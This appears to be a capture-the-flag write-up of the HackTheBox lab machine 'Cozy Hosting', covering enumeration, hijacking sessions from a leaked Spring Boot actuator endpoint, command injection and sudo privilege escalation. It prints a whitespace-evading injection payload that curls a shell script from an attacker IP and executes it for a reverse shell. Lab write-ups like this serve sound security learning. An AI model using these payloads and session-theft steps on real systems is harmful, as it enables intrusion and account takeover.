---
title: Cozy Hosting

date: 2023-10-25
categories:
  - HTB
tags:
  - Writeups

---

# Introduction
Hey guys 👋!
Today we will be solving an easy HackTheBox machine called **Cozy Hosting**. This machine focuses on session hijacking and command injection. Without wasting any time, let's jump into it.

## Nmap Scan
We will start with the initial Nmap scan to see what ports are open on his machine.

![](https://i.imgur.com/LUT0BWH.png)

There are 2 ports open (22,80). There is also something interesting that the target IP resolves to a domain name i.e., `http://cozyhosting.htb`. Let's add this domain name to our hosts file and see what this website is about.

## Website Enumeration
As soon as we add the hostname to our hosts file, we are able to access the website. This is a hosting website. Let's check the website and see what we can find.
![](https://i.imgur.com/FhM5EQo.png)

Let's poke around and see what we can find. After looking around, we got to know that this website is using bootstrap v5.2.3. After a little more research, we found that the framework this website is using is `springboot framework` 

![](https://i.imgur.com/pIMnCff.png)

There was also a login form which will not easy to bypass. So we will look for some other method to bypass login or something. Other than this information, we did not find anything interesting. So let's fire up gobuster and see what directories this website is hiding from us 😏. Using gobuster, we got some interesting results. The only result that I was interested in was the `/actuator/sessions` directory. Let's navigate to this directory and see what we can find.

![](https://i.imgur.com/W4gNY7z.png)

When we navigated to the directory, we found what we were looking for, session cookies for a user account 😃. 

![](https://i.imgur.com/NaQ7k33.png)

Let's use these cookies and see if we can hijack user session and log into the website.

## Session Hijacking
As we expected, using the `kanderson` cookie, we were able to bypass the login and hijack the user session to log into the website. 

![](https://i.imgur.com/itR3CYA.png)

After logging in, the dashboard seems useless because there are no clickable links or redirection, Until we scroll down. When we scroll down, we see something very interesting. two fields asking for `hostname` and `username`. These fields look like some type of command execution parameters. 

![](https://i.imgur.com/f4AyiZe.png)

Lets fire up the burpsuite and see what these fields are doing.

## Command Injection and Reverse Shell
By testing the request in burpsuite, we saw in the URL that the website trying to run ssh command to execute. It was confirmed there is command injection. after some more testing, the command injection was in the second field i.e., `username`. Now it looked pretty easy to get a reverse shell, but it wasn't. White spaces were not allowed in the payload command. To avoid the white spaces and get a reverse shell, we used the following payload.
Create a reverse shell and spin up the web server to deliver the shell.

```bash
IFS=_;command=curl_http://10.10.16.79/shell.sh_--output_/tmp/shell.sh;$(command)
IFS=_;command=chmod_+x_/tmp/shell.sh;$(command)
IFS=_;command=/tmp/shell.sh;$(command)
```

Above payload gave us initial foothold. 

![](https://i.imgur.com/YxlDUuY.png)

Now, let's stabilize this reverse shell and download the file we are seeing in the target machine.

![](https://i.imgur.com/zNAGhog.png)

As we have stabilized our shell, let's download the jar file and see what it is. After downloading and looking closely into the file, we came to know that this is the website's source code file. And in this file, we found credentials that seems like `postgresSQL` login credentials. Let's use these credentials and see if it works.
```credentials
postgres:************
```

The above credentials did gave us access to the database. After logging into the postgres, there was a database named `cozyhosting`. After looking into the database, we got some users with their password hashes.

![](https://i.imgur.com/XQ2cc4W.png)

Let's grab these hashes and see what we can do with the cracked hashes. With the hashes, there was a home directory for the user named `josh`. This might be the actual user on this box. Let's pass these hashes to hashcat and see what we can get. After the hascat is done, we are left with the followings;

```
admin:<cracked_password>
josh:<cracked_password>
```

Lets try to ssh into the machine and see if we can get any connection. The admin user didn't work but the josh user worked and we have the user level access on the machine 😃.
Lets get the user flag first and move to the next step.

![](https://i.imgur.com/JU2BRLS.png)

## Privilege Escalation
Now we are heading to our last stage of this machine i.e., privilege escalation. To escalate our privileges,we need to find an attack vector. To do this, first we will loo for any type of binary or script of that we have permission to run as root or any cronjobs that are running ass root user privileges. Type `sudo -l` and in most cases, it gives us some pretty valuable information we are looking.

![](https://i.imgur.com/B5tydoO.png)

As we can see, we do have permissions to run something with root privileges. Let's head over to [GTFObins](https://gtfobins.github.io) and see how we can use ssh to spawn a root shell. GTFObins gave us a payload that will spawn us a root shell. Lets use it and get the root flag.

![](https://i.imgur.com/qviAnso.png)

And this machine is rooted. It was a great journey so far. I hope you guys enjoyed it and learned something new. If you think there is some space for improvement or I explained something wring, feel free to ping me 😉. Until then, Good Bye!
